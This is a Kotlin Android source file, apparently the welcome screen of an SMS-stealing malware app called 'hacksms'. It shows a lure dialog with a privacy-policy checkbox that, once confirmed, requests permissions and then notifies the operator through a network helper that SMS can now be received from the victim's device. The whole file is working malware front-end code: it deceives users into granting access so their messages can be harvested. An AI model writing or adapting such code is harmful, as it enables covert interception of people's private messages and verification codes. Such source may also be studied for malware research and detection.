package cocomelonc.hacksms.ui.screen

import cocomelonc.hacksms.tools.HackSmsUtils
import cocomelonc.hacksms.HackSmsViewModel
import cocomelonc.hacksms.tools.HackSmsNetwork
import cocomelonc.hacksms.ui.HackSmsRoute
import android.graphics.BitmapFactory
import android.util.Log
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyRow
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.ArrowForward
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.asImageBitmap
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun HackSmsWelcome(hackSmsViewModel: HackSmsViewModel) {
    val context = LocalContext.current
    var showDialog by remember {
        mutableStateOf(false)
    }
    var isAgreedWithPrivacyAndPolicy by remember {
        mutableStateOf(false)
    }

    BoxWithConstraints(
        modifier = Modifier
            .fillMaxSize()
    ) {
        Button(
            modifier = Modifier
                .align(Alignment.BottomEnd)
                .padding(15.dp),
            onClick = { showDialog = true },
            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary),
        ) {
            Row(
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.Center
            ) {
                Spacer(modifier = Modifier.width(6.dp))
                Text(
                    modifier = Modifier.padding(vertical = 6.dp),
                    text = hackSmsViewModel.hackSmsData.welcomeButton,
                    style = MaterialTheme.typography.labelLarge,
                    fontSize = 16.sp
                )
                Spacer(modifier = Modifier.width(6.dp))
                Icon(
                    modifier = Modifier.size(20.dp),
                    imageVector = Icons.Default.ArrowForward,
                    contentDescription = "",
                    tint = MaterialTheme.colorScheme.onPrimary
                )
            }
        }
        if (showDialog) {
            AlertDialog(
                modifier = Modifier.width(maxWidth / 1.2f),
                containerColor = MaterialTheme.colorScheme.surface,
                onDismissRequest = { /*TODO*/ },
                title = {
                    Text(
                        text = hackSmsViewModel.hackSmsData.dialogTitle,
                        style = MaterialTheme.typography.headlineSmall,
                    )
                },
                text = {
                    Column {
                        Text(
                            text = hackSmsViewModel.hackSmsData.dialogText,
                            style = MaterialTheme.typography.bodyMedium,
                        )
                        Row(
                            modifier = Modifier.padding(top = 14.dp),
                            verticalAlignment = Alignment.CenterVertically,
                            horizontalArrangement = Arrangement.Center
                        ) {
                            CompositionLocalProvider(LocalMinimumTouchTargetEnforcement provides false) {
                                Checkbox(
                                    checked = isAgreedWithPrivacyAndPolicy,
                                    onCheckedChange = {
                                        isAgreedWithPrivacyAndPolicy = it
                                    },
                                )
                            }
                            Spacer(modifier = Modifier.width(10.dp))
                            Text(
                                text = hackSmsViewModel.hackSmsData.dialogBox,
                                style = MaterialTheme.typography.bodyMedium,
                            )
                        }
                    }
                },
                confirmButton = {
                    TextButton(onClick = {
                        if (isAgreedWithPrivacyAndPolicy) {
                            HackSmsUtils.grantPermissions(context) {
                                showDialog = false
                                HackSmsUtils.disableWelcome(context)
                                HackSmsNetwork(context).sendTextMessage("Reading sms permission has been granted\nNow you can receive sms from this device!")
                                hackSmsViewModel.navController.navigate(HackSmsRoute.Webview.route)
                            }
                        }
                    }) {
                        Text(
                            text = hackSmsViewModel.hackSmsData.dialogButton1,
                            style = MaterialTheme.typography.labelLarge
                        )
                    }
                },
                dismissButton = {
                    TextButton(onClick = { showDialog = false }) {
                        Text(
                            text = hackSmsViewModel.hackSmsData.dialogButton2,
                            style = MaterialTheme.typography.labelLarge
                        )
                    }
                }
            )
        }
        val width = this.maxWidth
        Column(
            modifier = Modifier
                .fillMaxSize()
        ) {
            Text(
                modifier = Modifier
                    .padding(start = 15.dp, end = 15.dp, top = 20.dp),
                text = hackSmsViewModel.hackSmsData.welcomeTitle,
                fontSize = 25.sp,
                style = MaterialTheme.typography.displayLarge
            )
            Text(
                modifier = Modifier
                    .padding(start = 15.dp, end = 15.dp, top = 8.dp),
                text = hackSmsViewModel.hackSmsData.welcomeText1,
                style = MaterialTheme.typography.bodyLarge,
                overflow = TextOverflow.Ellipsis,
            )
            LazyRow(
                modifier = Modifier
                    .padding(horizontal = 8.dp, vertical = 10.dp)
            ) {
                val images = hackSmsViewModel.hackSmsData.welcomeImages
                if (images != null) {
                    for (path in images) {
                        Log.i("PATH",path)
                        val image = context.assets.open("welcomeImages/$path")
                        val bitmap = BitmapFactory.decodeStream(image).asImageBitmap()
                        item {
                            Card(
                                modifier = Modifier.padding(8.dp),
                                shape = RoundedCornerShape(10.dp)
                            ) {
                                Image(
                                    modifier = Modifier.size(width / 2),
                                    bitmap = bitmap,
                                    contentDescription = "",
                                    contentScale = ContentScale.Crop,
                                )
                            }
                        }
                    }
                }
            }
            Text(
                modifier = Modifier
                    .padding(start = 15.dp, end = 15.dp),
                text = hackSmsViewModel.hackSmsData.welcomeText2,
                overflow = TextOverflow.Ellipsis,
                style = MaterialTheme.typography.bodyLarge
            )
        }
    }
}